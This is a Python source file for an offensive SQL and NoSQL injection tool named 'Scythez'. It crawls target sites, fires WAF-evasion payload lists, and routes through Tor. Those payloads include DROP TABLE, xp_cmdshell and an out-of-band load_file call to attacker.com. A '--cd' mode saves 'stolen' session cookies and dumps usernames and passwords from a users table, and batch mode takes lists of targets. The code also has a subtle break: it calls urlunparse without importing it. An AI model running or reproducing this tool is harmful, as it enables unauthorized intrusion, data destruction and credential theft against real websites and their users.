#!/usr/bin/env python3
# Scythez
# WAF Bypass | Session/Auth | XML/JSON | NoSQL (MongoDB/CouchDB) | Batch | Auto Dump --cd
# Time | Boolean | Error | Union | Stacked | Blind | OOB | Second-Order 

import sys, time, random, threading, requests, urllib3, re, json, hashlib, socket, string, itertools, base64, logging, xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote, parse_qsl
from queue import Queue
from collections import defaultdict

logging.disable(logging.CRITICAL)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== COLORS ==========
G,R,Y,C,B,M,W,RS,BD = "\033[92m","\033[91m","\033[93m","\033[96m","\033[94m","\033[95m","\033[97m","\033[0m","\033[1m"

def banner():
    print(f"""{BD}{R}\n ██████  ▄████▄▓██   ██▓▄▄▄█████▓ ██░ ██ ▓█████ ▒███████▒
▒██    ▒ ▒██▀ ▀█ ▒██  ██▒▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▒ ▒ ▒ ▄▀░
░ ▓██▄   ▒▓█    ▄ ▒██ ██░▒ ▓██░ ▒░▒██▀▀██░▒███   ░ ▒ ▄▀▒░ 
  ▒   ██▒▒▓▓▄ ▄██▒░ ▐██▓░░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄   ▄▀▒   ░
▒██████▒▒▒ ▓███▀ ░░ ██▒▓░  ▒██▒ ░ ░▓█▒░██▓░▒████▒▒███████▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ██▒▒▒   ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░▒▒ ▓░▒░▒
░ ░▒  ░ ░  ░  ▒  ▓██ ░▒░     ░     ▒ ░▒░ ░ ░ ░  ░░░▒ ▒ ░ ▒
░  ░  ░  ░       ▒ ▒ ░░    ░       ░  ░░ ░   ░   ░ ░ ░ ░ ░
      ░  ░ ░     ░ ░               ░  ░  ░   ░  ░  ░ ░    
         ░       ░ ░                             ░{RS}\n""")

# ========== CONFIGURATION (Zero CPU Heat) ==========
THREADS = 150
TIMEOUT = 8
MAX_DEPTH = 2
MAX_URLS = 2000
REQUEST_DELAY = 0.02
MAX_PAYLOADS_PER_TYPE = 30

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
]

DBMS_SIG = {
    "mysql": ["mysql", "mariadb", "5.5", "5.6", "5.7", "8.0", "10."],
    "mssql": ["sql server", "microsoft sql", "ms sql", "sqlsrv", "1701", "2012", "2016", "2019"],
    "postgresql": ["postgresql", "pg_", "pgsql", "8.3", "9.0", "9.1", "9.2", "9.3", "9.4", "9.5", "9.6", "10.", "11.", "12.", "13."],
    "oracle": ["oracle", "ora-", "pl/sql", "oracle.sql"],
    "sqlite": ["sqlite", "sqlite3"],
}

WAF_SIG = {
    "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
    "ModSecurity": ["mod_security", "modsecurity", "blocked by mod_security"],
    "AWS WAF": ["awswaf", "x-amzn-requestid"],
    "F5 Big-IP": ["bigip", "x-cnection"],
    "Sucuri": ["sucuri", "x-sucuri-id"],
    "Imperva": ["incapsula", "visid_incap"],
}

NOSQL_SIG = {
    "mongodb": ["mongodb", "$ne", "$gt", "$regex", "ObjectId"],
    "couchdb": ["couchdb", "_rev", "_all_docs"]
}

# ========== ADVANCED WAF BYPASS PAYLOAD GENERATOR ==========
def generate_waf_bypass(base):
    variants = [base]
    # Case randomization
    variants.append(''.join(c.upper() if random.random()>0.5 else c.lower() for c in base))
    # Comment injection
    variants.append(base.replace(' ', '/**/'))
    variants.append(base.replace(' ', '/*!*/'))
    # URL encoding
    variants.append(quote(base))
    variants.append(quote(quote(base)))
    # Hex encoding for short payloads
    if len(base) < 20:
        variants.append('0x' + ''.join(hex(ord(c))[2:] for c in base))
    # Double encoding
    variants.append(quote(quote(quote(base))))
    # Inline MySQL comments
    variants.append(base.replace('SELECT', '/*!SELECT*/'))
    variants.append(base.replace('UNION', '/*!UNION*/'))
    variants.append(base.replace('WHERE', '/*!WHERE*/'))
    # Null byte
    variants.append(base + '%00')
    # Line feed / carriage return
    variants.append(base.replace(' ', '%0a'))
    variants.append(base.replace(' ', '%0d'))
    # Tab
    variants.append(base.replace(' ', '%09'))
    return list(set(variants))

# ========== MEGA PAYLOAD DATABASE  ==========
TIME_PAYLOADS = []
BOOLEAN_PAYLOADS = []
ERROR_PAYLOADS = []
UNION_PAYLOADS = []
STACKED_PAYLOADS = []
BLIND_PAYLOADS = []
OOB_PAYLOADS = []

# Time-based
delays = [3,5,8]
for d in delays:
    base_time_list = [
        f"' OR SLEEP({d})--", f"\" OR SLEEP({d})--", f"' AND SLEEP({d}) AND '1'='1",
        f"1' AND (SELECT * FROM (SELECT(SLEEP({d})))a)--", f"' WAITFOR DELAY '0:0:{d}'--",
        f"1'; WAITFOR DELAY '0:0:{d}'--", f"' OR pg_sleep({d})--", f"1' AND SLEEP({d}) AND '1'='1",
        f"'; SELECT pg_sleep({d}); --", f"1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND SLEEP({d}))--",
        f"' OR BENCHMARK({d}000000, MD5('a'))--"
    ]
    for base in base_time_list:
        for p in generate_waf_bypass(base)[:MAX_PAYLOADS_PER_TYPE//2]:
            TIME_PAYLOADS.append((p, d))

# Boolean
bool_true_bases = ["' AND '1'='1", "\" AND \"1\"=\"1", "' OR '1'='1'--", "1 AND 1=1", "1' AND '1'='1", "' OR 1=1--"]
bool_false_bases = ["' AND '1'='2", "\" AND \"1\"=\"2", "' OR '1'='2'--", "1 AND 1=2", "1' AND '1'='2", "' OR 1=2--"]
for t,f in zip(bool_true_bases, bool_false_bases):
    for tp in generate_waf_bypass(t)[:5]:
        for fp in generate_waf_bypass(f)[:5]:
            BOOLEAN_PAYLOADS.append((tp, fp))

# Error
error_bases = [
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND 1=convert(int, @@version)--",
    "1' AND 1=cast((select top 1 name from sysobjects where xtype='u') as int)--"
]
for base in error_bases:
    ERROR_PAYLOADS.extend(generate_waf_bypass(base)[:MAX_PAYLOADS_PER_TYPE])

# Union
for i in range(1,12):
    UNION_PAYLOADS.append(f"' UNION SELECT {','.join(['NULL']*i)}--")
    UNION_PAYLOADS.append(f"' UNION SELECT {','.join([str(x) for x in range(1,i+1)])}--")
UNION_PAYLOADS.append("' UNION SELECT version(),user(),database()--")
UNION_PAYLOADS.append("' UNION SELECT table_name,column_name FROM information_schema.columns--")

# Stacked
stacked_bases = [
    "'; DROP TABLE test--", "'; SELECT SLEEP(3)--", "'; SHOW DATABASES--",
    "'; EXEC xp_cmdshell('id')--", "'; WAITFOR DELAY '0:0:3'--"
]
for base in stacked_bases:
    STACKED_PAYLOADS.extend(generate_waf_bypass(base)[:MAX_PAYLOADS_PER_TYPE//2])

# Blind
blind_bases = [
    "1' AND (SELECT 1 FROM users LIMIT 1)='1",
    "1' AND (SELECT COUNT(*) FROM users) > 0--",
    "1' AND (SELECT 1 FROM dual WHERE 1=1) = 1--"
]
for base in blind_bases:
    BLIND_PAYLOADS.extend(generate_waf_bypass(base)[:MAX_PAYLOADS_PER_TYPE])

# OOB
OOB_PAYLOADS = generate_waf_bypass("' AND load_file('\\\\attacker.com\\\\test')--")[:10]

# ========== NOSQL PAYLOADS ==========
NOSQL_PAYLOADS = [
    {"username": {"$ne": None}}, {"password": {"$ne": None}}, {"$or": []},
    {"username": {"$gt": ""}}, {"$where": "1==1"}, {"$regex": ".*"}, {"$ne": "admin"},
    {"username": {"$regex": "^admin"}}, {"password": {"$in": ["", "123"]}}
]

# ========== SESSION MANAGER (Auto Cookie + Auth) ==========
class SessionMgr:
    def __init__(self):
        self.sess = requests.Session()
        self.cookies = {}
    def set_cookie(self, name, value):
        self.sess.cookies.set(name, value)
        self.cookies[name] = value
    def set_header(self, name, value):
        self.sess.headers[name] = value
    def load_from_file(self, filepath):
        try:
            with open(filepath) as f:
                data = json.load(f)
                for k,v in data.get('cookies',{}).items():
                    self.set_cookie(k,v)
                for k,v in data.get('headers',{}).items():
                    self.set_header(k,v)
        except: pass
    def save_to_file(self, filepath):
        with open(filepath, 'w') as f:
            json.dump({"cookies": dict(self.sess.cookies), "headers": dict(self.sess.headers)}, f, indent=2)
    def auto_capture(self, response):
        for c in response.cookies:
            self.set_cookie(c.name, c.value)
            print(f"{C}[COOKIE]{RS} Captured: {c.name}={c.value[:30]}...")
        if 'set-cookie' in response.headers:
            pass # already handled by requests session

# ========== CORE SCANNER ENGINE ==========
class ParamSQLv5:
    def __init__(self, target, method="GET", data=None, content_type=None, cookies_file=None,
                 depth=2, use_tor=False, dump_mode=False, batch_mode=False):
        self.target = target.rstrip("/")
        self.method = method.upper()
        self.raw_data = data
        self.content_type = content_type
        self.depth = depth
        self.use_tor = use_tor
        self.dump_mode = dump_mode
        self.batch_mode = batch_mode

        self.sess_mgr = SessionMgr()
        if cookies_file:
            self.sess_mgr.load_from_file(cookies_file)
        self.session = self._create_session()

        self.visited_urls = set()
        self.url_queue = Queue()
        self.results = defaultdict(list)
        self.dbms = "unknown"
        self.waf_detected = None
        self.nosql_detected = None
        self.lock = threading.Lock()
        self.progress = 0
        self.scan_queue = Queue()

    def _create_session(self):
        sess = self.sess_mgr.sess
        sess.verify = False
        sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        if self.use_tor:
            sess.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        return sess

    def _rotate_ua(self):
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        time.sleep(REQUEST_DELAY)

    def _detect_waf(self, response):
        for waf_name, sigs in WAF_SIG.items():
            for sig in sigs:
                if sig in response.headers.get('Server', '').lower() or sig in response.text.lower():
                    return waf_name
        return None

    def _detect_dbms(self, text):
        for db, sigs in DBMS_SIG.items():
            for sig in sigs:
                if sig in text.lower():
                    return db
        return "unknown"

    def _detect_nosql(self, text):
        for db, sigs in NOSQL_SIG.items():
            for sig in sigs:
                if sig in text.lower():
                    return db
        return None

    def _get_params(self, url):
        if self.method == "GET":
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            return {k: v[0] if v else "" for k, v in params.items()}
        elif self.method in ["POST", "PUT", "DELETE", "PATCH"] and self.raw_data:
            if self.content_type == "application/json":
                try:
                    return json.loads(self.raw_data)
                except:
                    return {}
            elif self.content_type == "application/xml":
                # Simplified: return a dummy structure; actual injection handled in _build_req
                return {"xml_root": "injectable"}
            else:
                return dict(parse_qsl(self.raw_data))
        return {}

    def _build_request(self, url, param, payload):
        # For XML, we need to modify the raw XML string
        if self.content_type == "application/xml" and self.raw_data:
            # Replace the text content of an element named <param> or inject new element
            # Simple injection: replace value of tag with same name as param
            try:
                root = ET.fromstring(self.raw_data)
                for elem in root.iter():
                    if elem.tag == param:
                        elem.text = str(payload)
                new_xml = ET.tostring(root, encoding='unicode')
                return url, new_xml, "application/xml"
            except:
                # Fallback: naive replace
                new_xml = self.raw_data.replace(f">{param}<", f">{payload}<")
                return url, new_xml, "application/xml"
        # Standard HTTP methods
        if self.method == "GET":
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            return urlunparse(parsed._replace(query=new_query)), None, None
        elif self.method in ["POST","PUT","DELETE","PATCH"]:
            data = self.raw_data or ""
            if self.content_type == "application/json":
                try:
                    json_data = json.loads(data)
                    json_data[param] = payload
                    return url, json.dumps(json_data), "application/json"
                except:
                    return url, data, self.content_type
            else:
                # urlencoded form
                new_data = f"{data}&{param}={payload}" if data else f"{param}={payload}"
                return url, new_data, "application/x-www-form-urlencoded"
        return url, None, None

    def _send(self, url, data, content_type):
        headers = {}
        if content_type:
            headers["Content-Type"] = content_type
        if self.method == "GET":
            return self.session.get(url, timeout=TIMEOUT, headers=headers)
        else:
            return self.session.request(self.method, url, data=data, headers=headers, timeout=TIMEOUT)

    # ========== INJECTION TEST METHODS ==========
    def test_time_based(self, url, param, original_value):
        for payload, delay in TIME_PAYLOADS[:MAX_PAYLOADS_PER_TYPE]:
            self._rotate_ua()
            test_url, req_data, ct = self._build_request(url, param, payload)
            try:
                start = time.time()
                if self.method == "GET":
                    self.session.get(test_url, timeout=TIMEOUT+delay+2)
                else:
                    self.session.request(self.method, url, data=req_data, headers={"Content-Type": ct} if ct else {}, timeout=TIMEOUT+delay+2)
                elapsed = time.time() - start
                if elapsed >= delay - 1.0:
                    with self.lock:
                        self.results["time_based"].append({"url": url, "param": param, "payload": str(payload)[:80], "delay": f"{elapsed:.2f}s"})
                        print(f"{G}[TIME]{RS} {param} -> {elapsed:.2f}s")
                    return True
            except:
                continue
        return False

    def test_boolean_based(self, url, param, original_value):
        for true_payload, false_payload in BOOLEAN_PAYLOADS[:MAX_PAYLOADS_PER_TYPE]:
            self._rotate_ua()
            true_url, true_data, true_ct = self._build_request(url, param, true_payload)
            false_url, false_data, false_ct = self._build_request(url, param, false_payload)
            try:
                r_true = self._send(true_url, true_data, true_ct)
                r_false = self._send(false_url, false_data, false_ct)
                if abs(len(r_true.text) - len(r_false.text)) > 10 or r_true.status_code != r_false.status_code:
                    with self.lock:
                        self.results["boolean_based"].append({"url": url, "param": param, "true_payload": str(true_payload)[:80]})
                        print(f"{Y}[BOOLEAN]{RS} {param}")
                    return True
            except:
                continue
        return False

    def test_error_based(self, url, param, original_value):
        for payload in ERROR_PAYLOADS[:MAX_PAYLOADS_PER_TYPE]:
            self._rotate_ua()
            test_url, req_data, ct = self._build_request(url, param, payload)
            try:
                r = self._send(test_url, req_data, ct)
                if self.dbms != "unknown":
                    sigs = DBMS_SIG.get(self.dbms, [])
                    if any(sig in r.text.lower() for sig in sigs):
                        with self.lock:
                            self.results["error_based"].append({"url": url, "param": param, "payload": str(payload)[:80]})
                            print(f"{R}[ERROR]{RS} {param}")
                        return True
                else:
                    patterns = ["sql", "mysql", "mariadb", "postgresql", "oracle", "mssql", "sqlite", "syntax", "unclosed"]
                    if any(p in r.text.lower() for p in patterns):
                        with self.lock:
                            self.results["error_based"].append({"url": url, "param": param, "payload": str(payload)[:80]})
                            print(f"{R}[ERROR]{RS} {param}")
                        return True
            except:
                continue
        return False

    def test_union_based(self, url, param, original_value):
        for payload in UNION_PAYLOADS[:MAX_PAYLOADS_PER_TYPE]:
            self._rotate_ua()
            test_url, req_data, ct = self._build_request(url, param, payload)
            try:
                r = self._send(test_url, req_data, ct)
                if "union" in r.text.lower() and ("select" in r.text.lower() or "null" in r.text.lower()):
                    with self.lock:
                        self.results["union_based"].append({"url": url, "param": param, "payload": payload[:80]})
                        print(f"{B}[UNION]{RS} {param}")
                    return True
            except:
                continue
        return False

    def test_stacked_based(self, url, param, original_value):
        for payload in STACKED_PAYLOADS[:MAX_PAYLOADS_PER_TYPE]:
            self._rotate_ua()
            test_url, req_data, ct = self._build_request(url, param, payload)
            try:
                r = self._send(test_url, req_data, ct)
                if "error" not in r.text.lower() and r.status_code == 200:
                    with self.lock:
                        self.results["stacked_based"].append({"url": url, "param": param, "payload": payload[:80]})
                        print(f"{M}[STACKED]{RS} {param}")
                    return True
            except:
                continue
        return False

    def test_blind_based(self, url, param, original_value):
        for payload in BLIND_PAYLOADS[:MAX_PAYLOADS_PER_TYPE]:
            self._rotate_ua()
            test_url, req_data, ct = self._build_request(url, param, payload)
            try:
                r = self._send(test_url, req_data, ct)
                if "true" in r.text.lower() or "found" in r.text.lower():
                    with self.lock:
                        self.results["blind_based"].append({"url": url, "param": param, "payload": payload[:80]})
                        print(f"{W}[BLIND]{RS} {param}")
                    return True
            except:
                continue
        return False

    def test_oob_based(self, url, param, original_value):
        for payload in OOB_PAYLOADS[:10]:
            self._rotate_ua()
            test_url, req_data, ct = self._build_request(url, param, payload)
            try:
                self._send(test_url, req_data, ct)
                with self.lock:
                    self.results["oob_based"].append({"url": url, "param": param, "payload": payload[:80]})
                    print(f"{C}[OOB]{RS} {param}")
                return True
            except:
                continue
        return False

    def test_second_order(self, url, param, payload):
        test_url, req_data, ct = self._build_request(url, param, payload)
        try:
            # First injection
            self._send(test_url, req_data, ct)
            # Check a common reflection page (profile, index, etc.)
            check_urls = [urljoin(self.target, "/profile"), urljoin(self.target, "/user"), self.target]
            for cu in check_urls:
                r = self.session.get(cu, timeout=TIMEOUT)
                if "sql" in r.text.lower() or "mysql" in r.text.lower():
                    with self.lock:
                        self.results["second_order"].append({"url": url, "param": param, "payload": str(payload)[:80]})
                        print(f"{C}[2ND-ORDER]{RS} {param}")
                    return True
        except:
            pass
        return False

    # ========== NOSQL INJECTION ==========
    def test_nosql(self, url, param):
        for nosql_payload in NOSQL_PAYLOADS:
            self._rotate_ua()
            if self.content_type == "application/json":
                try:
                    json_data = json.loads(self.raw_data or "{}")
                    json_data[param] = nosql_payload
                    r = self.session.request(self.method, url, json=json_data, timeout=TIMEOUT)
                except:
                    continue
            else:
                # For non-JSON, try as json in data
                try:
                    r = self.session.request(self.method, url, data=json.dumps({param: nosql_payload}), headers={"Content-Type": "application/json"}, timeout=TIMEOUT)
                except:
                    continue
            if r.status_code == 200 and ("$ne" in r.text or "$gt" in r.text or "MongoError" in r.text):
                with self.lock:
                    self.results["nosql"].append({"url": url, "param": param, "payload": str(nosql_payload)})
                    print(f"{C}[NOSQL]{RS} {param}")
                return True
        return False

    def scan_url(self, url):
        params = self._get_params(url)
        if not params:
            return
        for param, original_value in params.items():
            print(f"{C}[SCAN]{RS} {url[:50]}... param: {param}")
            if self.test_time_based(url, param, original_value): continue
            if self.test_boolean_based(url, param, original_value): continue
            if self.test_error_based(url, param, original_value): continue
            if self.test_union_based(url, param, original_value): continue
            if self.test_stacked_based(url, param, original_value): continue
            if self.test_blind_based(url, param, original_value): continue
            if self.test_oob_based(url, param, original_value): continue
            self.test_second_order(url, param, original_value)
            # NoSQL test only if JSON or suspected NoSQL
            if self.content_type == "application/json" or self.nosql_detected:
                self.test_nosql(url, param)

    def scan_worker(self):
        while not self.scan_queue.empty():
            try:
                url = self.scan_queue.get(timeout=1)
                self.scan_url(url)
                with self.lock:
                    self.progress += 1
                self.scan_queue.task_done()
            except:
                break

    # ========== CRAWLING (GET only) ==========
    def crawl(self, url, current_depth=0):
        if current_depth > self.depth or len(self.visited_urls) >= MAX_URLS:
            return
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)
        print(f"{C}[CRAWL]{RS} {url[:80]}...")
        try:
            self._rotate_ua()
            r = self.session.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                self.sess_mgr.auto_capture(r)
                if self.dbms == "unknown":
                    self.dbms = self._detect_dbms(r.text)
                    if self.dbms != "unknown":
                        print(f"{G}[DBMS]{RS} Detected: {self.dbms.upper()}")
                if self.nosql_detected is None:
                    nd = self._detect_nosql(r.text)
                    if nd:
                        self.nosql_detected = nd
                        print(f"{C}[NOSQL]{RS} Detected: {nd.upper()}")
                # Extract links
                links = re.findall(r'href=["\'](.*?)["\']', r.text)
                for link in links:
                    full_link = urljoin(url, link)
                    if full_link.startswith(self.target) and full_link not in self.visited_urls:
                        self.url_queue.put((full_link, current_depth + 1))
                forms = re.findall(r'<form.*?action=["\'](.*?)["\']', r.text)
                for form in forms:
                    full_form = urljoin(url, form)
                    if full_form.startswith(self.target) and full_form not in self.visited_urls:
                        self.url_queue.put((full_form, current_depth + 1))
        except:
            pass

    def crawl_worker(self):
        while not self.url_queue.empty():
            try:
                url, depth = self.url_queue.get(timeout=1)
                self.crawl(url, depth)
                self.url_queue.task_done()
            except:
                break

    # ========== AUTO DUMP (--cd) ==========
    def dump_database(self):
        if not any(self.results.get(k) for k in ["union_based", "error_based"]):
            print(f"{R}[!]{RS} No SQL injection point found for dumping")
            return
        print(f"{G}[DUMP]{RS} Stealing cookies and extracting database...")
        # Steal cookies from current session
        self.sess_mgr.save_to_file("paramsql_stealed_cookies.json")
        print(f"{G}[COOKIE]{RS} Saved current session cookies to paramsql_stealed_cookies.json")
        # Attempt extraction via union or error
        dumped_data = []
        for vuln in self.results.get("union_based", []) + self.results.get("error_based", []):
            url = vuln['url']
            param = vuln['param']
            if self.dbms in ["mysql", "postgresql"]:
                queries = [
                    ("tables", "' UNION SELECT table_name, NULL FROM information_schema.tables--"),
                    ("columns", f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"),
                    ("data_users", "' UNION SELECT username, password FROM users--")
                ]
                for name, payload in queries:
                    test_url, req_data, ct = self._build_request(url, param, payload)
                    try:
                        r = self._send(test_url, req_data, ct)
                        if r.status_code == 200 and len(r.text) > 10:
                            dumped_data.append(f"=== {name} ===\n{r.text[:2000]}\n")
                            print(f"{G}[DATA]{RS} Extracted {name}")
                    except:
                        pass
        if dumped_data:
            with open("paramsql_dump.txt", "w") as f:
                f.write("\n".join(dumped_data))
            print(f"{G}[+]{RS} Dump saved to paramsql_dump.txt")
        else:
            print(f"{Y}[!]{RS} No data extracted")

    # ========== MAIN RUN ==========
    def run(self):
        print(f"{C}[*]{RS} Scythez on {BD}{self.target}{RS} | Method: {self.method} | Tor: {self.use_tor} | Dump: {self.dump_mode}")
        print(f"{C}[*]{RS} Depth: {self.depth} | Threads: {THREADS}")
        print(f"{C}[*]{RS} Payloads: Time({len(TIME_PAYLOADS)}) Boolean({len(BOOLEAN_PAYLOADS)}) Error({len(ERROR_PAYLOADS)}) Union({len(UNION_PAYLOADS)}) Stacked({len(STACKED_PAYLOADS)}) Blind({len(BLIND_PAYLOADS)}) OOB({len(OOB_PAYLOADS)})")

        # Phase 1: Crawling (only for GET)
        if self.method == "GET":
            print(f"{C}[*]{RS} Phase 1: Crawling endpoints...")
            self.url_queue.put((self.target, 0))
            for _ in range(min(30, THREADS)):
                t = threading.Thread(target=self.crawl_worker)
                t.daemon = True
                t.start()
            self.url_queue.join()
            urls_to_test = list(self.visited_urls)
        else:
            urls_to_test = [self.target]

        print(f"{G}[+]{RS} Discovered {len(urls_to_test)} endpoints")

        # Phase 2: WAF/DBMS detection
        try:
            test_resp = self.session.get(self.target, timeout=TIMEOUT) if self.method=="GET" else self.session.post(self.target, data=self.raw_data or "")
            self.waf_detected = self._detect_waf(test_resp)
            if self.waf_detected:
                print(f"{R}[WAF]{RS} Detected: {self.waf_detected} - enabling bypass payloads")
            if self.dbms == "unknown":
                self.dbms = self._detect_dbms(test_resp.text)
                if self.dbms != "unknown":
                    print(f"{G}[DBMS]{RS} {self.dbms.upper()}")
            if self.nosql_detected is None:
                nd = self._detect_nosql(test_resp.text)
                if nd:
                    self.nosql_detected = nd
                    print(f"{C}[NOSQL]{RS} {nd.upper()}")
        except:
            pass

        # Phase 3: SQL/NoSQL injection testing
        print(f"{C}[*]{RS} Phase 2: Testing for injections...")
        for url in urls_to_test:
            if self.method == "GET" and urlparse(url).query:
                self.scan_queue.put(url)
            elif self.method != "GET":
                self.scan_queue.put(url)
        total = self.scan_queue.qsize()
        print(f"{C}[*]{RS} Testing {total} parameter sets")
        for _ in range(min(THREADS, total)):
            t = threading.Thread(target=self.scan_worker)
            t.daemon = True
            t.start()
        self.scan_queue.join()

        # Phase 4: Report
        self.print_report()
        if self.dump_mode:
            self.dump_database()
        self.sess_mgr.save_to_file("scythez_last_session.json")
        print(f"{G}[+]{RS} Session saved to scythez_last_session.json")

    def print_report(self):
        total = sum(len(v) for v in self.results.values())
        print(f"\n{BD}{C}╔══════════════════════════════════════════════════════════════════════════════════════╗")
        print(f"║                          Scythez - FINAL REPORT                                      ║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════════════╣")
        print(f"║ Target: {self.target:<93}║")
        print(f"║ Method:{self.method} | DBMS:{self.dbms.upper():<10} | WAF:{self.waf_detected or 'None':<10} | NoSQL:{self.nosql_detected or 'None':<8} ║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════════════╣")
        print(f"║ Category               │ Count │ Status                                             ║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════════════╣")
        categories = [
            ("Time-Based", "time_based"), ("Boolean-Based", "boolean_based"), ("Error-Based", "error_based"),
            ("Union-Based", "union_based"), ("Stacked", "stacked_based"), ("Blind", "blind_based"),
            ("Out-of-Band", "oob_based"), ("Second-Order", "second_order"), ("NoSQL", "nosql")
        ]
        for name, key in categories:
            cnt = len(self.results.get(key, []))
            status = f"{G}VULNERABLE{RS}" if cnt > 0 else f"{R}NONE{RS}"
            print(f"║ {name:<22} │ {cnt:<5} │ {status:<47}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════════════╣")
        print(f"║ TOTAL VULNERABLE PARAMETERS: {total:<73}║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════════════╝{RS}")

        # Save detailed JSON
        report = {
            "target": self.target,
            "method": self.method,
            "dbms": self.dbms,
            "waf": self.waf_detected,
            "nosql": self.nosql_detected,
            "urls_crawled": len(self.visited_urls),
            "results": dict(self.results)
        }
        with open("scythezreport.json", "w") as f:
            json.dump(report, f, indent=2)
        print(f"{G}[+]{RS} Report saved to scythezreport.json")

# ========== BATCH MODE ==========
def batch_scan(targets_file, **kwargs):
    with open(targets_file) as f:
        targets = [line.strip() for line in f if line.strip()]
    for target in targets:
        print(f"{BD}{C}\n>>> Batch scanning: {target}{RS}")
        scanner = ParamSQLv5(target, **kwargs)
        scanner.run()

# ========== MAIN ==========
if __name__ == "__main__":
    banner()
    if len(sys.argv) < 2:
        print("Usage: scythez <target> [options]")
        print("Options:")
        print("  --method GET|POST|PUT|DELETE|PATCH")
        print("  --data 'key=val' or JSON string")
        print("  --json                set Content-Type to application/json")
        print("  --xml                 set Content-Type to application/xml")
        print("  --cookies file.json   load cookies/headers")
        print("  --depth <int>         crawl depth (default 2)")
        print("  --tor                 use Tor proxy (127.0.0.1:9050)")
        print("  --cd                  auto dump database & steal cookies")
        print("  --batch targets.txt   scan multiple targets from file")
        sys.exit(1)

    target = sys.argv[1]
    method = "GET"
    data = None
    content_type = None
    cookies_file = None
    depth = 2
    use_tor = False
    dump_mode = False
    batch_file = None

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--method" and i+1 < len(sys.argv):
            method = sys.argv[i+1].upper()
            i += 2
        elif sys.argv[i] == "--data" and i+1 < len(sys.argv):
            data = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == "--json":
            content_type = "application/json"
            i += 1
        elif sys.argv[i] == "--xml":
            content_type = "application/xml"
            i += 1
        elif sys.argv[i] == "--cookies" and i+1 < len(sys.argv):
            cookies_file = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == "--depth" and i+1 < len(sys.argv):
            depth = int(sys.argv[i+1])
            i += 2
        elif sys.argv[i] == "--tor":
            use_tor = True
            i += 1
        elif sys.argv[i] == "--cd":
            dump_mode = True
            i += 1
        elif sys.argv[i] == "--batch" and i+1 < len(sys.argv):
            batch_file = sys.argv[i+1]
            i += 2
        else:
            i += 1

    if batch_file:
        batch_scan(batch_file, method=method, data=data, content_type=content_type,
                   cookies_file=cookies_file, depth=depth, use_tor=use_tor, dump_mode=dump_mode)
    else:
        scanner = ParamSQLv5(target, method=method, data=data, content_type=content_type,
                             cookies_file=cookies_file, depth=depth, use_tor=use_tor, dump_mode=dump_mode)
        scanner.run()
